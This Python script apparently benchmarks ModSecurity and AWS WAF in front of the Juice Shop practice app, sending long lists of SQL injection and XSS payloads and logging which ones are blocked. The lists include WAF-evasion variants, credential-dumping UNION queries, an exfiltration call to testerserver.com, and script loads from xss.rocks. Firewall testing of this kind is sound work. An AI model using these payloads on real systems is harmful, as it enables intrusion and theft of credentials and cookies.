import requests
import json
import os
import time
import urllib2
import sys

##############################################################################################################
#Configurations
#1. Remove existing modsecurity audit logs in /usr/local/nginx/conf/logs/modsec_audit.log
#2. Restart nginx service - a new log file will be generated
#3. Send the Post/Get request to juice-shop
#4. Print out the response status code
#5. Print out the [msg: ] part in the new audit log file

print("Which WAF do you want to test?\nEnter 'modsecurity' or 'aws_waf':")
WAF_NAME = raw_input()
#URLs for our WAF instances
mod_url = 'http://54.183.15.129:80'
aws_url = 'http://34.215.46.242:80'

#Logs extraction regex
mod_rd_log = "sudo cat /usr/local/nginx/conf/logs/modsec_audit.log"
mod_sql_regex = "| grep 942 | grep -o -P '\[msg.*?\]'"
mod_xss_regex = "| grep 941 | grep -o -P '\[msg.*?\]'"
mod_normal_regex = "| grep -o -P '\[msg.*?\]'"

#Logs refreshing commands
mod_rm_log = "sudo rm /usr/local/nginx/conf/logs/modsec_audit.log"
mod_rs_nginx = "sudo service nginx restart"

#Filling in parameters
jsurl = ""
rd_log = ""
sql_regex = ""
xss_regex = ""
normal_regex = ""
rm_log = ""
rs_nginx = ""
valid = 0

if WAF_NAME == "modsecurity" :
    jsurl = mod_url
    rd_log = mod_rd_log
    sql_regex = mod_sql_regex
    xss_regex = mod_xss_regex
    normal_regex = mod_normal_regex
    rm_log = mod_rm_log
    rs_nginx = mod_rs_nginx
    log_name = 'mod_test_results.csv'
    valid = 1

if WAF_NAME == "aws_waf" :
    jsurl = aws_url
    rd_log = mod_rd_log
    sql_regex = mod_sql_regex
    xss_regex = mod_xss_regex
    normal_regex = mod_normal_regex
    rm_log = mod_rm_log
    rs_nginx = mod_rs_nginx
    log_name = 'mod_test_results.csv'
    valid = 1

if valid == 0:
    print("Invalid WAF name")
    sys.exit()

f = open(log_name, 'w')

##################################################################################################################
#Part 1: SQLi Testing
print("##################SQLi Testing###################")

#Record testing results into a file
f.write('SQL Test Cases, Status_Code, Logs\n')
#number of sqli test cases
sql_num_tc = 0

#SQLi GET query list
sqlget_query_list = []
sqlget_query_list.append('invalid\')) UNION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC1
sqlget_query_list.append('invalid\')) UNI/**/ON SEL/**/ECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC2
sqlget_query_list.append('invalid\')) U%6eION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC3
sqlget_query_list.append('invalid\')) UNI*ON SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC4
sqlget_query_list.append('invalid\')) UNI/%2A%2A/ON SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC5
sqlget_query_list.append('invalid\')) UnIoN SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC6
sqlget_query_list.append('invalid\')) %0A%0Dunion%0A%0D SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC7
sqlget_query_list.append('banana\' ORDER BY 1 ASC--') # TC8
sqlget_query_list.append('banana\' AND \'1\'=\'1') # TC9
sqlget_query_list.append('invalid\')) UNION SELECT 1,1,null--') # TC10
sqlget_query_list.append('banana\' AND LENGTH(username)=N AND \'1\' = \'1') # TC11
sqlget_query_list.append('banana || UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--') # TC12
sqlget_query_list.append('banana || UTL_HTTP.request(\'testerserver.com:80\'||(SELECT user FROM DUAL)--') # TC13
sqlget_query_list.append('banana || AND IF(version() like \'5%\', sleep(10), \'false\'))--') # TC14
sqlget_query_list.append('banana or \'1\'=                \'1') # TC15
sqlget_query_list.append('invalid\')) UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--') # TC16
sqlget_query_list.append('invalid\')) EXEC(\'UNI\'+\'ON \'+\'SEL\' + \'ECT 1\')') # TC17
sqlget_query_list.append('invalid\')) UNION SELECT password FROM Users WHERE name = unhex(\'726F6F74\')--') # TC18
sqlget_query_list.append('invalid\')) UNION SELECT password FROM Users WHERE name = 726F6F74--') # TC19
sqlget_query_list.append('invalid\')) U%6eION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC20
sqlget_query_list.append('invalid\')) UNION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS%2d-') # TC21
sqlget_query_list.append('invalid\')) UNION SEL*ECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC22
sqlget_query_list.append('invalid\')) UNION SEL/%2A%2A/ECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC23
sqlget_query_list.append('invalid\')) UNION SeLeCT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC24
sqlget_query_list.append('banana\' %4fRDER BY 1 ASC--') # TC25
sqlget_query_list.append('banana\' A%6eD \'1\'=\'1') # TC26
sqlget_query_list.append('banana\' AND LE%4eGTH(username)=N AND \'1\' = \'1') # TC27
sqlget_query_list.append('banana || UTL_I%4eADDR.GET_HOST_%4eAME( (SELECT user FROM DUAL) )--') # TC28
sqlget_query_list.append('banana || UT%4c_HTTP.request(\'testerserver.com:80\'||(SELECT user FROM DUAL)--') # TC29
sqlget_query_list.append('banana || AND IF(versio%6e() like \'5%\', sleep(10), \'false\'))--') # TC30
sqlget_query_list.append("banana or '1'= %20%20%20%20%20%20%20%20%20'1") # TC31

#SQLi POST query list
sqlpost_username_list = []
sqlpost_password_list = []
sqlpost_username_list.append('admin@juice-sh.op\'--') # TC32
sqlpost_password_list.append('foo') 
sqlpost_username_list.append('admin@juice-sh.op') # TC33
sqlpost_password_list.append('\' OR 1=1--') 
sqlpost_username_list.append("1' or '1' = '1'))-- ") # TC34
sqlpost_password_list.append('foo') 
sqlpost_username_list.append("1' or '1' = '1')) LIMIT 1-- ") # TC35
sqlpost_password_list.append('foo') 
sqlpost_username_list.append("1' or '1' = '1')) %6cIMIT 1--") # TC36
sqlpost_password_list.append('foo') 
sqlpost_username_list.append('admin@juice-sh.op') # TC37
sqlpost_password_list.append('\' %4fR 1=1--') 
sqlpost_username_list.append('admin@juice-sh.op') # TC38
sqlpost_password_list.append('\' O/**/R 1=1--') 
sqlpost_username_list.append('admin@juice-sh.op') # TC39
sqlpost_password_list.append('\' O/%2A%2A/R 1=1--') 
sqlpost_username_list.append('admin@juice-sh.op') # TC40
sqlpost_password_list.append("' OR 'SQLi' = 'SQL'+'i'/*") 
sqlpost_username_list.append('admin@juice-sh.op') # TC41
sqlpost_password_list.append("' OR 'SQLi' > 'S'/*") 
sqlpost_username_list.append('admin@juice-sh.op') # TC42
sqlpost_password_list.append("' OR 20 > 1--") 
sqlpost_username_list.append('admin@juice-sh.op') # TC43
sqlpost_password_list.append("' OR 2 between 3 and 1--") 
sqlpost_username_list.append('admin@juice-sh.op') # TC44
sqlpost_password_list.append("' OR 'SQLi' = N'SQLi'") 
sqlpost_username_list.append('admin@juice-sh.op') # TC45
sqlpost_password_list.append("' 1 || 1 = 1") 
sqlpost_username_list.append('admin@juice-sh.op') # TC46
sqlpost_password_list.append("' 1 && 1 = 1") 
sqlpost_username_list.append('admin@juice-sh.op') # TC47
sqlpost_password_list.append("' 1 and 1 = 1") 

#Run the get queries one by one and record the logs
for query in sqlget_query_list:
    sql_num_tc = sql_num_tc + 1
    os.system(rm_log)
    os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("SQL TC%d - response status_code: %d"%(sql_num_tc,login.status_code))
    time.sleep(0.5)
    logs = os.popen(rd_log+sql_regex).read()
    print("Logs:%s"%(logs))
    c_logs = logs.replace('\n',' ')
    f.write('TC%d,%d,%s\n'%(sql_num_tc,login.status_code, c_logs))

#Then, run the post queries one by one and record the logs
for index, query in enumerate(sqlpost_username_list):
    sql_num_tc = sql_num_tc + 1
    os.system(rm_log)
    os.system(rs_nginx)
    session = requests.Session()
    auth = json.dumps({'email': sqlpost_username_list[index], 'password': sqlpost_password_list[index]})
    login = session.post('{}/rest/user/login'.format(jsurl),
                     headers={'Content-Type': 'application/json'},
                     data=auth)
    print("SQL TC%d - response status_code: %d"%(sql_num_tc,login.status_code))
    time.sleep(0.5)
    logs = os.popen(rd_log+sql_regex).read()
    print("Logs:%s"%(logs))
    c_logs = logs.replace('\n',' ')
    f.write('TC%d,%d,%s\n'%(sql_num_tc,login.status_code, c_logs))



##################################################################################################################
#Part 2: XSS Testing
print("")
print("##################XSS Testing###################")

#number of xss test cases
xss_num_tc = 0

#Record testing results into a file
f.write('XSS Test Cases, Status_Code, Logs\n')

#XSS query list
query_list = []
query_list.append('3Cscript%3Ealert(123)%3C%2Fscript%3E') # TC1
query_list.append('%3Cimg%20src%3Dx%20onerror%3Dalert(\'xss\')%3E') # TC2
query_list.append('3CScRiPt%3Ealert(document.cookie)%3C%2FScRiPt%3E') # TC3
query_list.append('%3Cscr%3Cscript%3Eipt%3Ealert(document.cookie)%3C%2Fscript%3E') # TC4
query_list.append('%3Ca%20href%3D%22http:%2F%2Fwww.google.com%22%3Ecan%20be%20found%20here!%3C%2Fa%3E') # TC5
query_list.append('%3CSCRIPT%20SRC%3Dhttp:%2F%2Fxss.rocks%2Fxss.js%3E%3C%2FSCRIPT%3E') # TC6
query_list.append('%3Cscript%20%3Ealert(document.cookie)%3C%2Fscript%20%3E') # TC7
query_list.append('%3CSCRIPT%2520a%3D%22%3E%22%2520SRC%3D%22http:%2F%2Fxss.rocks%2Fxss.js%22%3E%3C%2FSCRIPT%3E') # TC8
query_list.append('%3Cimg%2Fid%3D%22confirm%26lpar;1)%22%2Falt%3D%22%2F%22src%3D%22%2F%22onerror%3Deval(id)%3E\'%22%3E') # TC9
query_list.append('%3CIMG%20SRC%3D%22javascript:alert(\'XSS\');%22%3E') # TC10
query_list.append('%3CIMG%20SRC%3Djavascript:alert(\'XSS\')%3E') # TC11
query_list.append('%3CIMG%20SRC%3DJaVaScRiPt:alert(\'XSS\')%3E') # TC12
query_list.append('%3CIMG%20SRC%3Djavascript:alert(%26quot;XSS%26quot;)%3E') # TC13
query_list.append('%3CIMG%20SRC%3D%60javascript:alert(%22RSnake%20says,%20\'XSS\'%22)%60%3E') # TC14
query_list.append('%3Ca%20onmouseover%3D%22alert(document.cookie)%22%3Exss%20link%3C%2Fa%3E') # TC15
query_list.append('%3Ca%20onmouseover%3Dalert(document.cookie)%3Exss%20link%3C%2Fa%3E') # TC16
query_list.append('%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C%2FSCRIPT%3E%22%3E') # TC17
query_list.append('%3CIMG%20SRC%3Djavascript:alert(String.fromCharCode(88,83,83))%3E') # TC18
query_list.append('%3CIMG%20SRC%3D%23%20onerror%3D%22alert(\'xss\')%22%3E') # TC19
query_list.append('%3CIMG%20SRC%3D%20onmouseover%3D%22alert(\'xss\')%22%3E') # TC20
query_list.append('%3CIMG%20onmouseover%3D%22alert(\'xss\')%22%3E') # TC21
query_list.append('%3CIMG%20SRC%3D%2F%20onerror%3D%22alert(String.fromCharCode(88,83,83))%22%3E%3C%2Fimg%3E') # TC22
query_list.append('%3Cimg%20src%3Dx%20onerror%3D%22%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%22%3E') # TC23
query_list.append('%3CIMG%20SRC%3D%26%23106;%26%2397;%26%23118;%26%2397;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2358;%26%2397;%26%23108;%26%23101;%26%23114;%26%23116;%26%2340;%20%26%2339;%26%2388;%26%2383;%26%2383;%26%2339;%26%2341;%3E') # TC24
query_list.append('%3CIMG%20SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%20%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E') # TC25
query_list.append('%3CIMG%20SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E') # TC26
query_list.append('%3CIMG%20SRC%3D%22jav%09ascript:alert(\'XSS\');%22%3E') # TC27
query_list.append('%3CIMG%20SRC%3D%22jav%26%23x09;ascript:alert(\'XSS\');%22%3E') # TC28
query_list.append('%3CIMG%20SRC%3D%22jav%26%23x0A;ascript:alert(\'XSS\');%22%3E') # TC29
query_list.append('%3CIMG%20SRC%3D%22jav%26%23x0D;ascript:alert(\'XSS\');%22%3E') # TC30
query_list.append('%3CIMG%20SRC%3D%22%20%26%2314;%20%20javascript:alert(\'XSS\');%22%3E') # TC31
query_list.append('%3CSCRIPT%2FXSS%20SRC%3D%22http:%2F%2Fxss.rocks%2Fxss.js%22%3E%3C%2FSCRIPT%3E') # TC32
query_list.append('%3CBODY%20onload!%23$%25%26()*~%2B-_.,:;%3F@%5B%2F%7C%5C%5D%5E%60%3Dalert(%22XSS%22)%3E') # TC33
query_list.append('%3CSCRIPT%2FSRC%3D%22http:%2F%2Fxss.rocks%2Fxss.js%22%3E%3C%2FSCRIPT%3E') # TC34
query_list.append('%3C%3CSCRIPT%3Ealert(%22XSS%22);%2F%2F%3C%3C%2FSCRIPT%3E') # TC35
query_list.append('%3CSCRIPT%20SRC%3Dhttp:%2F%2Fxss.rocks%2Fxss.js%3F%3C%20B%20%3E') # TC36
query_list.append('%3CSCRIPT%20SRC%3D%2F%2Fxss.rocks%2F.j%3E') # TC37
query_list.append('%3CIMG%20SRC%3D%22javascript:alert(\'XSS\')%22') # TC38
query_list.append('%3Ciframe%20src%3Dhttp:%2F%2Fxss.rocks%2Fscriptlet.html%20%3C') # TC=39
query_list.append('3C%2Fscript%3E%3Cscript%3Ealert(\'XSS\');%3C%2Fscript%3E') # TC40
query_list.append('%3C%2FTITLE%3E%3CSCRIPT%3Ealert(%22XSS%22);%3C%2FSCRIPT%3E') # TC41
query_list.append('%3CINPUT%20TYPE%3D%22IMAGE%22%20SRC%3D%22javascript:alert(\'XSS\');%22%3E') # TC42
query_list.append('%3CBODY%20BACKGROUND%3D%22javascript:alert(\'XSS\')%22%3E') # TC43
query_list.append('%3CIMG%20DYNSRC%3D%22javascript:alert(\'XSS\')%22%3E') # TC44
query_list.append('%3CIMG%20LOWSRC%3D%22javascript:alert(\'XSS\')%22%3E') # TC45
query_list.append('%3CIMG%20SRC%3D\'vbscript:msgbox(%22XSS%22)\'%3E') # TC46
query_list.append('%3Csvg%2Fonload%3Dalert(\'XSS\')%3E') # TC37
query_list.append('Set.constructor%60alert%5Cx28document.domain%5Cx29%60%60%60') # TC48
query_list.append('%3CBODY%20ONLOAD%3Dalert(\'XSS\')%3E')  # TC49
query_list.append('3CBGSOUND%20SRC%3D%22javascript:alert(\'XSS\');%22%3E') # TC50          
query_list.append('%3CBR%20SIZE%3D%22%26%7Balert(\'XSS\')%7D%22%3E') # TC51
query_list.append('%3CLINK%20REL%3D%22stylesheet%22%20HREF%3D%22javascript:alert(\'XSS\');%22%3E')  # TC52
query_list.append('%3CLINK%20REL%3D%22stylesheet%22%20HREF%3D%22http:%2F%2Fxss.rocks%2Fxss.css%22%3E')   # TC53     
query_list.append('%3CSTYLE%3E@import\'http:%2F%2Fxss.rocks%2Fxss.css\';%3C%2FSTYLE%3E')  # TC54
query_list.append('%3CMETA%20HTTP-EQUIV%3D%22Link%22%20Content%3D%22%3Chttp:%2F%2Fxss.rocks%2Fxss.css%3E;%20REL%3Dstylesheet%22%3E')  # TC55       
query_list.append('%3CSTYLE%3EBODY%7B-moz-binding:url(%22http:%2F%2Fxss.rocks%2Fxssmoz.xml%23xss%22)%7D%3C%2FSTYLE%3E')  # TC56
query_list.append('%3CSTYLE%3E@im%5Cport\'%5Cja%5Cvasc%5Cript:alert(%22XSS%22)\';%3C%2FSTYLE%3E')  # TC57
query_list.append('%3CIMG%20STYLE%3D%22xss:expr%2F*XSS*%2Fession(alert(\'XSS\'))%22%3E')  # TC58
query_list.append('exp%2F*%3CA%20STYLE%3D\'no%5Cxss:noxss(%22*%2F%2F*%22);%20xss:ex%2F*XSS*%2F%2F*%2F*%2Fpression(alert(%22XSS%22))\'%3E')  # TC59
query_list.append('%3CSTYLE%3E.XSS%7Bbackground-image:url(%22javascript:alert(\'XSS\')%22);%7D%3C%2FSTYLE%3E%3CA%20CLASS%3DXSS%3E%3C%2FA%3E') # TC60
query_list.append('%3CSTYLE%20type%3D%22text%2Fcss%22%3EBODY%7Bbackground:url(%22javascript:alert(\'XSS\')%22)%7D%3C%2FSTYLE%3E')  # TC61
query_list.append('%3CXSS%20STYLE%3D%22xss:expression(alert(\'XSS\'))%22%3E')   # TC62
query_list.append('%C2%BCscript%C2%BEalert(%C2%A2XSS%C2%A2)%C2%BC%2Fscript%C2%BE') # TC63
query_list.append('%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220;url%3Djavascript:alert(\'XSS\');%22%3E')  # TC64     
query_list.append('%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220;url%3Ddata:text%2Fhtml%20base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E') # TC65       
query_list.append('%3CIFRAME%20SRC%3D%22javascript:alert(\'XSS\');%22%3E%3C%2FIFRAME%3E')  # TC66   
query_list.append('%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert(document.cookie)%22%3E%3C%2FIFRAME%3E')  # TC67     
query_list.append('%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript:alert(\'XSS\');%22%3E%3C%2FFRAMESET%3E')  # TC68      
query_list.append('%3CTABLE%20BACKGROUND%3D%22javascript:alert(\'XSS\')%22%3E')   # TC69
query_list.append('%3CTABLE%3E%3CTD%20BACKGROUND%3D%22javascript:alert(\'XSS\')%22%3E')   # TC70  
query_list.append('%3CDIV%20STYLE%3D%22background-image:%20url(javascript:alert(\'XSS\'))%22%3E')  # TC71
query_list.append('%3CDIV%20STYLE%3D%22background-image:%5C0075%5C0072%5C006C%5C0028\'%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029\'%5C0029%22%3E')  # TC72
query_list.append('%3CDIV%20STYLE%3D%22background-image:%20url(%26%231;javascript:alert(\'XSS\'))%22%3E')  # TC73
query_list.append('%3CDIV%20STYLE%3D%22width:%20expression(alert(\'XSS\'));%22%3E')  # TC74
query_list.append('%3CBASE%20HREF%3D%22javascript:alert(\'XSS\');%2F%2F%22%3E')  # TC75
query_list.append('%3COBJECT%20TYPE%3D%22text%2Fx-scriptlet%22%20DATA%3D%22http:%2F%2Fxss.rocks%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E') # TC76
query_list.append('%3CEMBED%20SRC%3D%22http:%2F%2Fha.ckers.org%2Fxss.swf%22%20AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E') # TC77
query_list.append('%3CEMBED%20SRC%3D%22data:image%2Fsvg%2Bxml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22%20type%3D%22image%2Fsvg%2Bxml%22%20AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E')  # TC78                    
query_list.append('%3CXML%20ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG%20SRC%3D%22javas%3C!--%20--%3Ecript:alert(\'XSS\')%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%20%3CSPAN%20DATASRC%3D%22%23xss%22%20DATAFLD%3D%22B%22%20DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E')  # TC79                    
query_list.append('%3CXML%20SRC%3D%22xsstest.xml%22%20ID%3DI%3E%3C%2FXML%3E%20%3CSPAN%20DATASRC%3D%23I%20DATAFLD%3DC%20DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E')  #80 
query_list.append('%3CHTML%3E%3CBODY%3E%20%3C%3Fxml:namespace%20prefix%3D%22t%22%20ns%3D%22urn:schemas-microsoft-com:time%22%3E%20%3C%3Fimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E%20%3Ct:set%20attributeName%3D%22innerHTML%22%20to%3D%22XSS%3CSCRIPT%20DEFER%3Ealert(%22XSS%22)%3C%2FSCRIPT%3E%22%3E%20%3C%2FBODY%3E%3C%2FHTML%3E')  # TC81
query_list.append('%3C!--%23exec%20cmd%3D%22%2Fbin%2Fecho%20\'%3CSCR\'%22--%3E%3C!--%23exec%20cmd%3D%22%2Fbin%2Fecho%20\'IPT%20SRC%3Dhttp:%2F%2Fxss.rocks%2Fxss.js%3E%3C%2FSCRIPT%3E\'%22--%3E')   # TC82
query_list.append('3C%3F%20echo(\'%3CSCR)\';%20echo(\'IPT%3Ealert(%22XSS%22)%3C%2FSCRIPT%3E\');%20%3F%3E')   # TC83
query_list.append('%3CIMG%20SRC%3D%22http:%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E')  # TC84   
query_list.append('%3CMETA%20HTTP-EQUIV%3D%22Set-Cookie%22%20Content%3D%22USERID%3D%3CSCRIPT%3Ealert(\'XSS\')%3C%2FSCRIPT%3E%22%3E') # TC85
query_list.append('%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text%2Fhtml;%20charset%3DUTF-7%22%3E%20%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert(\'XSS\');%2BADw-%2FSCRIPT%2BAD4-') #TC86            
query_list.append('%3CSCRIPT%20%3D%22%3E%22%20SRC%3D%22httx:%2F%2Fxss.rocks%2Fxss.js%22%3E%3C%2FSCRIPT%3E')  # TC87            
query_list.append('%3CA%20HREF%3D%22http:%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E')  #TC88
query_list.append('%3CA%20HREF%3D%22http:%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E')  #TC89
query_list.append('%3CA%20HREF%3D%22http:%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E')  #TC90
query_list.append('%3CA%20HREF%3D%22http:%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E') #TC91
query_list.append('%3CA%20HREF%3D%22http:%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E') #TC92
query_list.append('%3CA%20HREF%3D%22h%20tt%09p:%2F%2F6%096.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E')  #TC93
query_list.append('%3CA%20HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E')  #TC94

#Run the get queries one by one and record the logs
for query in query_list:
    xss_num_tc = xss_num_tc + 1
    os.system(rm_log)
    os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("XSS TC%d - response status_code: %d"%(xss_num_tc,login.status_code))
    time.sleep(0.5)
    logs = os.popen(rd_log+mod_xss_regex).read()
    print("Logs:%s"%(logs))
    c_logs = logs.replace('\n',' ')
    f.write('TC%d,%d,%s\n'%(xss_num_tc,login.status_code, c_logs))


##################################################################################################################
#Part 3: Normal Traffic Testing
print("")
print("##################Normal Traffic Testing###################")

#number of xss test cases
normal_num_tc = 0

#Record testing results into a file
f.write('Normal Test Cases, Status_Code, Logs\n')

#Normal GET query list
normal_query_list = []
normal_query_list.append('sqli') # TC1
normal_query_list.append('apple') # TC2
normal_query_list.append('banananana') # TC3
normal_query_list.append('union') # TC4
normal_query_list.append('select') # TC5
normal_query_list.append('and') # TC6
normal_query_list.append('UNION') # TC7
normal_query_list.append('or') # TC8
normal_query_list.append('OR') # TC9
normal_query_list.append('AND') # TC10
normal_query_list.append('1') # TC11
normal_query_list.append('or 1') # TC12
normal_query_list.append('and 1') # TC13
normal_query_list.append('union shop') # TC14
normal_query_list.append('and 1') # TC15
normal_query_list.append('script') # TC16
normal_query_list.append('xss alert') # TC17
normal_query_list.append('SCRIPT') # TC18
normal_query_list.append('href') # TC19
normal_query_list.append('link') # TC20
normal_query_list.append('LINK') # TC21
normal_query_list.append('HREF') # TC22
normal_query_list.append('www.google.com') # TC23
normal_query_list.append('UTL_HTTP') # TC24
normal_query_list.append('LENGTH') # TC25
normal_query_list.append('username') # TC26
normal_query_list.append('password') # TC27
normal_query_list.append('admin') # TC28
normal_query_list.append('exec') # TC29
normal_query_list.append('order') # TC30
normal_query_list.append('request') # TC31
normal_query_list.append('users') # TC32
normal_query_list.append('--') # TC33
normal_query_list.append('/**/') # TC34
normal_query_list.append('/*') # TC35


#Normal POST query list
normal_username_list = []
normal_password_list = []
normal_username_list.append('admin@juice-sh.op') # TC36
normal_password_list.append('admin123') 
normal_username_list.append('admin@juice-sh.op') # TC37
normal_password_list.append('admin12345') 
normal_username_list.append('admin@juice-sh.op') # TC38
normal_password_list.append('or') 
normal_username_list.append('admin@juice-sh.op') # TC39
normal_password_list.append('and') 
normal_username_list.append('admin@juice-sh.op') # TC40
normal_password_list.append('1=1') 
normal_username_list.append('admin@juice-sh.op') # TC41
normal_password_list.append('union') 
normal_username_list.append('admin@juice-sh.op') # TC42
normal_password_list.append('select') 
normal_username_list.append('wrongusername') # TC43
normal_password_list.append('foo') 
normal_username_list.append('john--') # TC44
normal_password_list.append('foo') 
normal_username_list.append('union') # TC45
normal_password_list.append('foo') 
normal_username_list.append('select') # TC46
normal_password_list.append('foo') 
normal_username_list.append('and') # TC47
normal_password_list.append('foo')
normal_username_list.append('or') # TC48
normal_password_list.append('foo')
normal_username_list.append('script') # TC49
normal_password_list.append('foo')
normal_username_list.append('xss alert') # TC50
normal_password_list.append('foo')
normal_username_list.append('SCRIPT') # TC51
normal_password_list.append('foo')
normal_username_list.append('href') # TC52
normal_password_list.append('foo')
normal_username_list.append('exec') # TC53
normal_password_list.append('foo')
normal_username_list.append('link') # TC54
normal_password_list.append('foo')
normal_username_list.append('UTL_HTTP') # TC55
normal_password_list.append('foo')
normal_username_list.append('LENGTH') # TC56
normal_password_list.append('foo')
normal_username_list.append('john') # TC57
normal_password_list.append('--')
normal_username_list.append('john') # TC58
normal_password_list.append('/**/')
normal_username_list.append('john') # TC59
normal_password_list.append('unhex')
normal_username_list.append('john') # TC60
normal_password_list.append('script')

#Run the get queries one by one and record the logs
for query in normal_query_list:
    normal_num_tc = normal_num_tc + 1
    os.system(rm_log)
    os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("Normal TC%d - response status_code: %d"%(normal_num_tc,login.status_code))
    time.sleep(0.5)
    logs = os.popen(rd_log+mod_normal_regex).read()
    print("Logs:%s"%(logs))
    c_logs = logs.replace('\n',' ')
    f.write('TC%d,%d,%s\n'%(normal_num_tc,login.status_code, c_logs))

#Then, run the post queries one by one and record the logs
for index, query in enumerate(normal_username_list):
    normal_num_tc = normal_num_tc + 1
    os.system(rm_log)
    os.system(rs_nginx)
    session = requests.Session()
    auth = json.dumps({'email': normal_username_list[index], 'password': normal_password_list[index]})
    login = session.post('{}/rest/user/login'.format(jsurl),
                     headers={'Content-Type': 'application/json'},
                     data=auth)
    print("Normal TC%d - response status_code: %d"%(normal_num_tc,login.status_code))
    time.sleep(0.5)
    logs = os.popen(rd_log+mod_normal_regex).read()
    print("Logs:%s"%(logs))
    c_logs = logs.replace('\n',' ')
    f.write('TC%d,%d,%s\n'%(normal_num_tc,login.status_code, c_logs))


f.close()

